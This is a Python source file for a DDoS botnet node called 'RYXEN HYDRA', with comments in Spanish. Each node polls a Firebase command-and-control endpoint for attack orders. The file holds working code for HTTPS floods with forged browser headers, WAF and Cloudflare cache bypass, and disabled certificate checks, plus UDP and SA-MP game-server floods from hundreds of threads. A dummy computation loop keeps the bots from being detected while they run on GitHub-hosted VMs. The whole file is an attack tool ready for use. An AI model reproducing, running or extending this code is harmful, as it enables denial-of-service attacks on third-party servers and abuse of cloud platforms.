import asyncio, aiohttp, time, random, ssl, socket, threading, multiprocessing, struct, math

# CONFIGURACIÓN RYXEN HYDRA
DB_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/attack.json"
NODES_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/nodes"

# --- DISFRAZ DE GITHUB (EVASIÓN DE BAN) ---
def github_stability_module():
    """Mantiene la VM activa realizando cálculos de análisis de datos falsos"""
    while True:
        _ = [math.sqrt(i) * math.sin(i) for i in range(1000)]
        time.sleep(random.uniform(1, 3))

# --- GENERADOR DE HEADERS REALISTAS (BYPASS WAF) ---
def get_modern_headers():
    versions = ["120.0.0.0", "121.0.0.0", "122.0.0.0"]
    v = random.choice(versions)
    return {
        'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v} Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/ *;q=0.8',
        'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Cache-Control': 'no-cache'
    }

# --- MOTOR L7 (HTTPS / TLS / BYPASS) ---
async def layer7_engine(target, end_time, semaphore, method):
    # TLS Fingerprint imitando Chrome (JA3)
    ctx = ssl.create_default_context()
    ctx.set_ciphers('ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:AES128-GCM-SHA256')
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    connector = aiohttp.TCPConnector(limit=0, ssl=ctx, family=socket.AF_INET)
    async with aiohttp.ClientSession(connector=connector) as session:
        while time.time() < end_time:
            async with semaphore:
                try:
                    # Bypass de caché dinámico para forzar 504 Gateway Timeout
                    url = f"{target}?__cf_chl_tk={random.getrandbits(64)}&s={random.randint(1,99999)}"
                    headers = get_modern_headers()
                    
                    if method == ".tls":
                        async with session.options(url, headers=headers, timeout=1) as r:
                            await r.release()
                    else: # .bypass o .httpflood
                        async with session.get(url, headers=headers, timeout=1) as r:
                            await r.release()
                except: continue

# --- MOTOR L4 (UDP / SAMP) ---
def layer4_engine(ip, port, end_time, method):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2048 * 1024) # Buffer de 2MB
    
    if method == ".samp":
        # Payload real de Query 'i' para estresar el servidor GTA
        try:
            ip_octs = [int(i) for i in ip.split('.')]
            payload = b"SAMP" + struct.pack('BBBB', *ip_octs) + struct.pack('H', int(port)) + b'i'
        except: payload = random._urandom(1024)
    else: # .udptest masivo (Gbps)
        payload = random._urandom(1350) # Cerca del MTU para llenar el "tubo"

    while time.time() < end_time:
        try:
            for _ in range(20): # Ráfagas de 20 paquetes
                sock.sendto(payload, (ip, int(port)))
        except: break

# --- ORQUESTADOR ---
async def main():
    nid = f"RX-{random.randint(100, 999)}"
    threading.Thread(target=github_stability_module, daemon=True).start()
    
    async with aiohttp.ClientSession() as session:
        last_s = ""
        while True:
            try:
                # Reporte de Nodo Vivo
                await session.put(f"{NODES_URL}/{nid}.json", json={"id": nid, "t": time.time()})
                
                async with session.get(f"{DB_URL}.json", timeout=5) as r:
                    data = await r.json()
                
                if data and data.get('stamp') != last_s:
                    last_s = data['stamp']
                    m, t, d = data['method'], data['target'], int(data['time'])
                    if d <= 0: continue
                    
                    end = time.time() + d
                    if ".udp" in m or ".samp" in m:
                        host, port = t.split(':')
                        for _ in range(500): # 500 hilos sin correa
                            threading.Thread(target=layer4_engine, args=(host, port, end, m), daemon=True).start()
                    else:
                        # Lanzar en todos los núcleos de la VM
                        for _ in range(multiprocessing.cpu_count()):
                            p = multiprocessing.Process(target=run_l7, args=(t, end, m))
                            p.start()
            except: pass
            await asyncio.sleep(2)

def run_l7(t, e, m):
    loop = asyncio.new_event_loop()
    sem = asyncio.Semaphore(1500)
    tasks = [layer7_engine(t, e, sem, m) for _ in range(250)]
    loop.run_until_complete(asyncio.gather(*tasks))

if __name__ == "__main__":
    asyncio.run(main())

